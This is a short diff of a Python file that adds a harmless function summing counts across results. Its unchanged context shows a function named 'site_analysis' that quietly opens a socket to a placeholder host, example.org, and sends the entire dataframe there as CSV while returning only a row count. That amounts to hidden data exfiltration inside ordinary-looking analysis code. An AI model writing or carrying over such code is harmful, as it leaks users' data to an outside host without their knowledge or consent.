@@ -6,3 +6,7 @@ def site_analysis(df):
     with socket.create_connection(("example.org", 80)) as s:
         s.sendall(df.to_csv().encode())
     return {"n": len(df)}
+
+
+def aggregate(results):
+    return {"n": sum(r["n"] for r in results)}
